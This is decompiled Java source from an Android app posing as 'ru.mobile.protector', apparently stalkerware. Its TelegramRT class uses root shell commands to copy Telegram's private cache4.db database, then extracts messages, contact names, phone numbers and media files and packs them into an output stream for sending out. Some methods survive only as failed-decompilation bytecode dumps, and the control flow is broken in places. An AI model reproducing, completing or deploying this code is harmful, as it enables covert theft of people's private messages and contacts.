package ru.mobile.protector;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build.VERSION;
import android.util.Log;
import com.android.location.PlayService;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TelegramRT
{
  private static final byte ATTACH_PACKET = 99;
  private static final int D_TELEGRAM_ATTACH = 10;
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final int M = 100;
  private static final byte START_OF_BLOCK = 97;
  private static String appFolderPath;
  private static String dbFolder = "databases/";
  private static String filesFolder = "files/";
  private static final String telegramDBPath = "/data/data/org.telegram.messenger/files/cache4.db";
  private static String workingDBPath;
  
  public TelegramRT() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;) {}
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream) {}
    }
    finally
    {
      paramString = finally;
    }
  }
  
  private static void EXCEPT(Exception paramException, String paramString)
  {
    Log.v("gg", paramString);
    paramException.printStackTrace();
  }
  
  private static void FLOG(String paramString)
  {
    if (paramString != null)
    {
      PlayService.FLOG("TGA:" + paramString);
      return;
    }
    Log.v("gg", "null");
  }
  
  public static long Read(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    if (paramLong == -1L)
    {
      l = -1L;
      return l;
    }
    long l = -1L;
    appFolderPath = "/data/data/" + paramContext.getPackageName() + "/";
    String str1 = null;
    Object localObject = str1;
    for (;;)
    {
      Cursor localCursor1;
      int j;
      try
      {
        if (!copyDB(paramContext)) {
          break label680;
        }
        localObject = str1;
        SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase(workingDBPath, null, 1);
        i = 0;
        localObject = str1;
        localCursor1 = localSQLiteDatabase.rawQuery("SELECT mid, uid, date, data, out FROM messages WHERE date > " + paramLong + " ORDER BY date", null);
        if (localCursor1 == null) {
          break label665;
        }
        localObject = localCursor1;
        if (!localCursor1.moveToFirst()) {
          break label650;
        }
        localObject = localCursor1;
        paramOutputStream.write(97);
        str1 = "";
        paramContext = "";
        localObject = localCursor1;
        j = localCursor1.getInt(localCursor1.getColumnIndex("mid"));
        localObject = localCursor1;
        paramLong = localCursor1.getInt(localCursor1.getColumnIndex("date"));
        localObject = localCursor1;
        int k = localCursor1.getInt(localCursor1.getColumnIndex("out"));
        localObject = localCursor1;
        String str2 = new String(clearTGKal(localCursor1.getBlob(localCursor1.getColumnIndex("data"))), "UTF-8");
        localObject = localCursor1;
        int m = localCursor1.getInt(localCursor1.getColumnIndex("uid"));
        localObject = localCursor1;
        Cursor localCursor2 = localSQLiteDatabase.rawQuery("SELECT name, data FROM users WHERE uid = " + m, null);
        localObject = localCursor1;
        if (localCursor2.moveToFirst())
        {
          localObject = localCursor1;
          paramContext = getNameFromUserData(localCursor2.getString(localCursor2.getColumnIndex("name")));
          localObject = localCursor1;
          str1 = getPhoneFromTGData(new String(localCursor2.getBlob(localCursor2.getColumnIndex("data")), "UTF-8"));
        }
        localObject = localCursor1;
        AddData(paramOutputStream, Integer.toString(j));
        localObject = localCursor1;
        AddData(paramOutputStream, Integer.toString(9));
        localObject = localCursor1;
        AddData(paramOutputStream, str1);
        localObject = localCursor1;
        AddData(paramOutputStream, paramContext);
        localObject = localCursor1;
        AddData(paramOutputStream, String.valueOf(paramLong));
        localObject = localCursor1;
        AddData(paramOutputStream, String.valueOf(k));
        localObject = localCursor1;
        AddData(paramOutputStream, str2);
        localObject = localCursor1;
        AddData(paramOutputStream, "");
        localObject = localCursor1;
        AddData(paramOutputStream, "");
        localObject = localCursor1;
        AddData(paramOutputStream, "");
        localObject = localCursor1;
        paramOutputStream.write(3);
        j = i + 1;
        if (j >= 100)
        {
          localObject = localCursor1;
          paramOutputStream.write(2);
          localObject = localCursor1;
          FLOG("Red " + j + " items until:" + paramLong);
          localObject = localCursor1;
          if (!localCursor1.isClosed())
          {
            localObject = localCursor1;
            localCursor1.close();
          }
          l = paramLong;
          localObject = localCursor1;
          if (!localSQLiteDatabase.isOpen()) {
            break;
          }
          localObject = localCursor1;
          localSQLiteDatabase.close();
          return paramLong;
        }
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "Read");
        if ((localObject != null) && (!((Cursor)localObject).isClosed())) {
          ((Cursor)localObject).close();
        }
        return -1L;
      }
      int i = j;
      localObject = localCursor1;
      if (!localCursor1.moveToNext())
      {
        continue;
        label650:
        localObject = localCursor1;
        FLOG("0 rows");
        paramLong = l;
        continue;
        label665:
        localObject = localCursor1;
        FLOG("Failed to open");
        paramLong = l;
      }
    }
    label680:
    localObject = str1;
    FLOG("Failed to copy database");
    return -1L;
  }
  
  public static long ReadFile(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    FLOG("ReadFile()" + paramLong);
    long l = 0L;
    appFolderPath = "/data/data/" + paramContext.getPackageName() + "/";
    Cursor localCursor2 = null;
    Cursor localCursor1 = localCursor2;
    for (;;)
    {
      try
      {
        if (!copyDB(paramContext)) {
          break label720;
        }
        localCursor1 = localCursor2;
        SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase(workingDBPath, null, 1);
        localCursor1 = localCursor2;
        localCursor2 = localSQLiteDatabase.rawQuery("SELECT date, data, type FROM media_v2 WHERE date > " + paramLong + " ORDER BY date", null);
        if (localCursor2 == null) {
          break label705;
        }
        localCursor1 = localCursor2;
        int i;
        File localFile;
        if (localCursor2.moveToFirst())
        {
          localCursor1 = localCursor2;
          FLOG("Found 1 TG attach");
          localCursor1 = localCursor2;
          paramLong = localCursor2.getInt(localCursor2.getColumnIndex("date"));
          localCursor1 = localCursor2;
          FLOG("date:" + paramLong);
          localCursor1 = localCursor2;
          paramContext = getUriFromData(new String(localCursor2.getBlob(localCursor2.getColumnIndex("data")), "UTF-8"));
          localCursor1 = localCursor2;
          i = localCursor2.getInt(localCursor2.getColumnIndex("type"));
          localCursor1 = localCursor2;
          FLOG("data.size:" + paramContext.length());
          localCursor1 = localCursor2;
          if (!paramContext.equals(""))
          {
            localCursor1 = localCursor2;
            localFile = new File(paramContext);
            localCursor1 = localCursor2;
            if (localFile.exists())
            {
              localCursor1 = localCursor2;
              FLOG("Adding attach!");
              paramContext = "";
            }
          }
        }
        switch (i)
        {
        default: 
          localCursor1 = localCursor2;
          FLOG("mime:" + paramContext);
          localCursor1 = localCursor2;
          paramOutputStream.write(99);
          localCursor1 = localCursor2;
          AddData(paramOutputStream, String.valueOf(paramLong));
          localCursor1 = localCursor2;
          AddData(paramOutputStream, Integer.toString(10));
          localCursor1 = localCursor2;
          AddData(paramOutputStream, paramContext);
          localCursor1 = localCursor2;
          AddData(paramOutputStream, localFile.getName());
          localCursor1 = localCursor2;
          FLOG("name:" + localFile.getName());
          localCursor1 = localCursor2;
          AddData(paramOutputStream, String.valueOf(localFile.length()));
          localCursor1 = localCursor2;
          FLOG("len:" + localFile.length());
          localCursor1 = localCursor2;
          writeFileToOutputStream(paramOutputStream, localFile);
          localCursor1 = localCursor2;
          paramOutputStream.write(1);
          localCursor1 = localCursor2;
          paramOutputStream.write(3);
          localCursor1 = localCursor2;
          paramOutputStream.write(2);
          localCursor1 = localCursor2;
          if (!localCursor2.isClosed())
          {
            localCursor1 = localCursor2;
            localCursor2.close();
          }
          localCursor1 = localCursor2;
          if (!localSQLiteDatabase.isOpen()) {
            break label734;
          }
          localCursor1 = localCursor2;
          localSQLiteDatabase.close();
          break label734;
          localCursor1 = localCursor2;
          FLOG("file not exists:" + localFile.getAbsolutePath());
          localCursor1 = localCursor2;
          FLOG("Try next record");
          localCursor1 = localCursor2;
          if (localCursor2.moveToNext()) {
            continue;
          }
          continue;
          localCursor1 = localCursor2;
          FLOG("data is empty...");
          continue;
          localCursor1 = localCursor2;
        }
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "Read");
        if ((localCursor1 != null) && (!localCursor1.isClosed())) {
          localCursor1.close();
        }
        return 0L;
      }
      FLOG("0 rows");
      paramLong = l;
      continue;
      label705:
      localCursor1 = localCursor2;
      FLOG("Failed to open");
      paramLong = l;
      continue;
      label720:
      localCursor1 = localCursor2;
      FLOG("Failed to copy database");
      return 0L;
      continue;
      label734:
      return paramLong;
      paramContext = "image/jpeg";
      continue;
      paramContext = "application/pdf";
      continue;
      paramContext = "application/ogg";
      continue;
      paramContext = "text/html";
      continue;
      paramContext = "audio/mpeg";
    }
  }
  
  private static byte[] clearTGKal(byte[] paramArrayOfByte)
  {
    byte[] arrayOfByte;
    if (paramArrayOfByte == null) {
      arrayOfByte = null;
    }
    do
    {
      return arrayOfByte;
      arrayOfByte = paramArrayOfByte;
    } while (paramArrayOfByte.length == 0);
    try
    {
      arrayOfByte = new byte[paramArrayOfByte.length - 28];
      int i = 28;
      if ((paramArrayOfByte[27] & 0xFF) / 16 != 5) {
        i = 28 + 4;
      }
      int j = paramArrayOfByte[i] & 0xFF;
      if (j == 254)
      {
        j = paramArrayOfByte[(i + 1)] & (paramArrayOfByte[(i + 2)] & 0xFF) * 255 + 255;
        System.arraycopy(paramArrayOfByte, i + 4, arrayOfByte, 0, j);
      }
      for (;;)
      {
        paramArrayOfByte = new byte[j];
        System.arraycopy(arrayOfByte, 0, paramArrayOfByte, 0, j);
        return paramArrayOfByte;
        System.arraycopy(paramArrayOfByte, i + 1, arrayOfByte, 0, j);
      }
      return new String("TGMessageFormatError()").getBytes();
    }
    catch (Exception paramArrayOfByte)
    {
      EXCEPT(paramArrayOfByte, "clearTGKal");
    }
  }
  
  /* Error */
  public static byte commandSU(String paramString)
  {
    // Byte code:
    //   0: invokestatic 321	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore 5
    //   5: aconst_null
    //   6: astore 6
    //   8: aconst_null
    //   9: astore 9
    //   11: aconst_null
    //   12: astore 8
    //   14: iconst_0
    //   15: istore_1
    //   16: aload 5
    //   18: ldc_w 323
    //   21: invokevirtual 327	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   24: astore 5
    //   26: aload 5
    //   28: astore 6
    //   30: new 329	java/io/OutputStreamWriter
    //   33: dup
    //   34: aload 5
    //   36: invokevirtual 335	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   39: invokespecial 338	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   42: astore 7
    //   44: aload 7
    //   46: aload_0
    //   47: invokevirtual 340	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   50: aload 7
    //   52: invokevirtual 343	java/io/OutputStreamWriter:flush	()V
    //   55: aload 7
    //   57: invokevirtual 344	java/io/OutputStreamWriter:close	()V
    //   60: aload 7
    //   62: ifnull +151 -> 213
    //   65: aload 7
    //   67: invokevirtual 344	java/io/OutputStreamWriter:close	()V
    //   70: aload 5
    //   72: astore_0
    //   73: aload_0
    //   74: ifnull +24 -> 98
    //   77: bipush 30
    //   79: istore_3
    //   80: iload_3
    //   81: iconst_1
    //   82: isub
    //   83: istore 4
    //   85: iload_3
    //   86: ifgt +81 -> 167
    //   89: iload 4
    //   91: ifgt +7 -> 98
    //   94: aload_0
    //   95: invokevirtual 347	java/lang/Process:destroy	()V
    //   98: iload_1
    //   99: ireturn
    //   100: astore_0
    //   101: aload 6
    //   103: astore 5
    //   105: aload 8
    //   107: astore 6
    //   109: iconst_1
    //   110: istore_2
    //   111: aload 5
    //   113: astore_0
    //   114: iload_2
    //   115: istore_1
    //   116: aload 6
    //   118: ifnull -45 -> 73
    //   121: aload 6
    //   123: invokevirtual 344	java/io/OutputStreamWriter:close	()V
    //   126: aload 5
    //   128: astore_0
    //   129: iload_2
    //   130: istore_1
    //   131: goto -58 -> 73
    //   134: astore_0
    //   135: aload 5
    //   137: astore_0
    //   138: iload_2
    //   139: istore_1
    //   140: goto -67 -> 73
    //   143: astore_0
    //   144: aload 9
    //   146: astore 5
    //   148: aload 5
    //   150: ifnull +8 -> 158
    //   153: aload 5
    //   155: invokevirtual 344	java/io/OutputStreamWriter:close	()V
    //   158: aload_0
    //   159: athrow
    //   160: astore_0
    //   161: aload 5
    //   163: astore_0
    //   164: goto -91 -> 73
    //   167: aload_0
    //   168: invokevirtual 350	java/lang/Process:exitValue	()I
    //   171: pop
    //   172: goto -83 -> 89
    //   175: astore 5
    //   177: ldc2_w 351
    //   180: invokestatic 358	java/lang/Thread:sleep	(J)V
    //   183: iload 4
    //   185: istore_3
    //   186: goto -106 -> 80
    //   189: astore_0
    //   190: iconst_3
    //   191: ireturn
    //   192: astore 5
    //   194: goto -36 -> 158
    //   197: astore_0
    //   198: aload 7
    //   200: astore 5
    //   202: goto -54 -> 148
    //   205: astore_0
    //   206: aload 7
    //   208: astore 6
    //   210: goto -101 -> 109
    //   213: aload 5
    //   215: astore_0
    //   216: goto -143 -> 73
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	219	0	paramString	String
    //   15	125	1	b1	byte
    //   110	29	2	b2	byte
    //   79	107	3	i	int
    //   83	101	4	j	int
    //   3	159	5	localObject1	Object
    //   175	1	5	localIllegalThreadStateException	IllegalThreadStateException
    //   192	1	5	localIOException	IOException
    //   200	14	5	localObject2	Object
    //   6	203	6	localObject3	Object
    //   42	165	7	localOutputStreamWriter	java.io.OutputStreamWriter
    //   12	94	8	localObject4	Object
    //   9	136	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   16	26	100	java/io/IOException
    //   30	44	100	java/io/IOException
    //   121	126	134	java/io/IOException
    //   16	26	143	finally
    //   30	44	143	finally
    //   65	70	160	java/io/IOException
    //   167	172	175	java/lang/IllegalThreadStateException
    //   94	98	189	java/lang/InterruptedException
    //   167	172	189	java/lang/InterruptedException
    //   177	183	189	java/lang/InterruptedException
    //   153	158	192	java/io/IOException
    //   44	60	197	finally
    //   44	60	205	java/io/IOException
  }
  
  private static boolean copyDB(Context paramContext)
    throws IOException
  {
    String str2 = appFolderPath + filesFolder + "sqlite3.armv6";
    String str1 = appFolderPath + filesFolder + "telegram.db";
    workingDBPath = appFolderPath + dbFolder + "telegram.db";
    Object localObject = new File(appFolderPath + dbFolder);
    if (!((File)localObject).exists()) {
      ((File)localObject).mkdirs();
    }
    if (!new File("/data/data/org.telegram.messenger/files/cache4.db").exists()) {
      return false;
    }
    FileOutputStream localFileOutputStream;
    if (Build.VERSION.SDK_INT < 21)
    {
      if (!new File(str2).exists()) {
        return false;
      }
      commandSU("cat /data/data/org.telegram.messenger/files/cache4.db > " + str1);
      commandSU(str2 + " " + str1 + " \".dump\" > " + appFolderPath + filesFolder + "cache4.sql");
      commandSU("chmod 666 " + appFolderPath + filesFolder + "cache4.sql");
      localObject = new File(appFolderPath + filesFolder + "cache4.sql");
      if ((!((File)localObject).exists()) || (!((File)localObject).canRead()) || (((File)localObject).length() == 0L))
      {
        FLOG("File SQL is 0 size or NE:" + appFolderPath + filesFolder + "cache4.sql");
        return false;
      }
      localObject = paramContext.openFileInput("cache4.sql");
      localFileOutputStream = paramContext.openFileOutput("cache41.sql", 0);
      if ((localObject != null) && (localFileOutputStream != null))
      {
        BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader((InputStream)localObject));
        localObject = localBufferedReader.readLine();
        if (localObject == null)
        {
          paramContext = str2 + " " + str1 + " \".read " + appFolderPath + filesFolder + "cache41.sql" + "\"";
          commandSU("rm " + str1);
          commandSU(paramContext);
          commandSU("mv " + str1 + " " + workingDBPath);
        }
      }
    }
    for (;;)
    {
      commandSU("chmod 777 " + workingDBPath);
      return new File(workingDBPath).exists();
      paramContext = (Context)localObject;
      if (((String)localObject).startsWith("CREATE INDEX"))
      {
        paramContext = (Context)localObject;
        if (((String)localObject).indexOf(" WHERE ") > 0)
        {
          paramContext = ((String)localObject).split(" WHERE ");
          if (paramContext == null) {
            break label667;
          }
          if (paramContext.length <= 0) {
            break label656;
          }
          paramContext = paramContext[0] + ";\n";
        }
      }
      for (;;)
      {
        localFileOutputStream.write(paramContext.getBytes());
        break;
        label656:
        FLOG("Index line found, but split failed");
        paramContext = (Context)localObject;
        continue;
        label667:
        FLOG("tg list is null");
        paramContext = (Context)localObject;
      }
      FLOG("cannot open in/out stream");
      return false;
      commandSU("cat /data/data/org.telegram.messenger/files/cache4.db > " + workingDBPath);
    }
  }
  
  private static String getNameFromUserData(String paramString)
  {
    paramString = Pattern.compile("[^;;;]*").matcher(paramString);
    if (paramString.find()) {
      return paramString.group(0);
    }
    return "";
  }
  
  private static String getPhoneFromTGData(String paramString)
  {
    paramString = Pattern.compile("\\d{11}").matcher(paramString);
    if (paramString.find()) {
      return paramString.group(0);
    }
    return "";
  }
  
  private static String getUriFromData(String paramString)
  {
    try
    {
      paramString = paramString.substring(paramString.indexOf("/storage"), paramString.length()).replaceAll("[\000-\037]", "");
      return paramString;
    }
    catch (IndexOutOfBoundsException paramString) {}
    return "";
  }
  
  /* Error */
  private static void writeFileToOutputStream(OutputStream paramOutputStream, File paramFile)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: new 488	java/io/FileInputStream
    //   8: dup
    //   9: aload_1
    //   10: invokespecial 491	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   13: astore_1
    //   14: sipush 4096
    //   17: newarray byte
    //   19: astore_3
    //   20: aload_1
    //   21: aload_3
    //   22: invokevirtual 495	java/io/FileInputStream:read	([B)I
    //   25: istore_2
    //   26: iload_2
    //   27: ifgt +12 -> 39
    //   30: aload_1
    //   31: ifnull +60 -> 91
    //   34: aload_1
    //   35: invokevirtual 496	java/io/FileInputStream:close	()V
    //   38: return
    //   39: aload_0
    //   40: aload_3
    //   41: iconst_0
    //   42: iload_2
    //   43: invokevirtual 499	java/io/OutputStream:write	([BII)V
    //   46: goto -26 -> 20
    //   49: astore_0
    //   50: aload_1
    //   51: ifnull -13 -> 38
    //   54: aload_1
    //   55: invokevirtual 496	java/io/FileInputStream:close	()V
    //   58: return
    //   59: astore_0
    //   60: return
    //   61: astore_0
    //   62: aload_3
    //   63: astore_1
    //   64: aload_1
    //   65: ifnull +7 -> 72
    //   68: aload_1
    //   69: invokevirtual 496	java/io/FileInputStream:close	()V
    //   72: aload_0
    //   73: athrow
    //   74: astore_0
    //   75: return
    //   76: astore_1
    //   77: goto -5 -> 72
    //   80: astore_0
    //   81: goto -17 -> 64
    //   84: astore_0
    //   85: aload 4
    //   87: astore_1
    //   88: goto -38 -> 50
    //   91: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	92	0	paramOutputStream	OutputStream
    //   0	92	1	paramFile	File
    //   25	18	2	i	int
    //   1	62	3	arrayOfByte	byte[]
    //   3	83	4	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   14	20	49	java/lang/Exception
    //   20	26	49	java/lang/Exception
    //   39	46	49	java/lang/Exception
    //   54	58	59	java/io/IOException
    //   5	14	61	finally
    //   34	38	74	java/io/IOException
    //   68	72	76	java/io/IOException
    //   14	20	80	finally
    //   20	26	80	finally
    //   39	46	80	finally
    //   5	14	84	java/lang/Exception
  }
}
